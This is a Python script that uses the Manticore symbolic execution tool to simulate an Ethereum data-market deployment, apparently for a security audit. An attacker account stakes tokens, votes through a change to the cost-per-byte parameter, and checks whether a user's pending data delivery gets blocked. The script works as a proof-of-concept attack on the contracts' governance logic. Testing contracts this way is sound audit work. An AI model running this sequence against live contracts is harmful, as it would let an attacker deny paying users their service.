from manticore.ethereum import ManticoreEVM
from manticore.utils import config
#from manticore.core.smtlib.expression import BoolAnd, BoolNot
from manticore.ethereum.abi import ABI

from initialize_market import initialize, DEFAULT_PARAMETERS
from constants import ONE_ETH, ONE_GWEI
from utils import increase_timestamp

consts = config.get_group("evm")
consts.oog = "ignore"

################ Script #######################

m = ManticoreEVM()

market_parameters = DEFAULT_PARAMETERS
market_parameters['vote_by_d'] = 1
market_parameters['pl'] = 1
market_parameters['stk'] = 1
market_parameters['cost'] = 1

market = initialize(m, parameters=market_parameters, user_initial_eth_balance=100*ONE_ETH )

backend_balance = 100 * ONE_ETH
backend_account = m.create_account(balance=backend_balance)
print("[+] Creating a backend account", hex(backend_account.address))

market.ether_token_contract.deposit(value=backend_balance, caller=backend_account)

market.ether_token_contract.approve(market.reserve_contract, backend_balance, caller=backend_account) 
market.market_token_contract.approve(market.voting_contract, backend_balance, caller=backend_account) 

market.reserve_contract.support(100*ONE_GWEI, caller=backend_account)

backend_url = "my_backend_url"
backend_url_hash = bytes.fromhex("59cda2aae91169ada6b8881e546e9c97187a2e6506d09d17e1fc8c3697e89eca")

market.datatrust_contract.register(backend_url, caller=backend_account)
market.voting_contract.vote(backend_url_hash, 1, caller=backend_account)

increase_timestamp(m, 32)

market.datatrust_contract.resolveRegistration(backend_url_hash, caller=backend_account)
market.datatrust_contract.getBackendAddress()

# user (market.ether_token_owner)
print("[+] Setting up a user account")

market.ether_token_contract.approve(market.reserve_contract, 100*ONE_ETH, caller=market.ether_token_owner) 
market.market_token_contract.approve(market.voting_contract, 100*ONE_ETH, caller=market.ether_token_owner) 
market.ether_token_contract.approve(market.datatrust_contract, 100*ONE_ETH, caller=market.ether_token_owner) 

market.reserve_contract.support(ONE_ETH, caller=market.ether_token_owner)

user_list_hash = "my_list_hash"
market.listing_contract.list(user_list_hash, caller=market.ether_token_owner)
market.voting_contract.vote(user_list_hash, 1, caller=market.ether_token_owner)

increase_timestamp(m, 32)

market.datatrust_contract.setDataHash(user_list_hash, backend_url_hash, caller=backend_account)
market.listing_contract.resolveApplication(user_list_hash, caller=market.ether_token_owner)

market.parameterizer_contract.getCostPerByte()

user_delivery_hash = "my_delivery_hash"

market.datatrust_contract.requestDelivery(user_delivery_hash, 100, caller=market.ether_token_owner)
market.datatrust_contract.listingAccessed(user_list_hash, user_delivery_hash, 100, caller=backend_account)

# attacker

attacker_balance = 100 * ONE_ETH
attacker_account = m.create_account(balance=attacker_balance)
print("[+] Creating a attacker account", hex(attacker_account.address))

market.ether_token_contract.deposit(value=attacker_balance, caller=attacker_account)
market.ether_token_contract.approve(market.reserve_contract, attacker_balance, caller=attacker_account) 
market.market_token_contract.approve(market.voting_contract, attacker_balance, caller=attacker_account) 

#value = m.make_symbolic_value(name="attacker_to_buy")
market.reserve_contract.support(100*ONE_GWEI, caller=attacker_account)

value = ONE_ETH #m.make_symbolic_value(name="cost_per_byte")
market.parameterizer_contract.reparameterize(11, value, caller=attacker_account)
market.parameterizer_contract.getHash(11, value)

value = b'\x9bS\xbb\xb2g\xdb\xe7\xf1\xa2T\x84\tP\xfa0\x8d\n\x00K{\xc6\x95Z\xa4\x10L\xe3\xa1m\xd2*\x89'
#value = m.make_symbolic_buffer(32)
market.voting_contract.vote(value, 1, caller=attacker_account)

increase_timestamp(m, 32)

market.parameterizer_contract.resolveReparam(value, caller=attacker_account)
market.parameterizer_contract.getCostPerByte()
market.datatrust_contract.delivered(user_delivery_hash, "url", caller=backend_account)

if (list(m.ready_states) == []):
  print("[+] requestDelivery was blocked by an attacker")

m.finalize()
print(f"[+] Look for results in {m.workspace}")
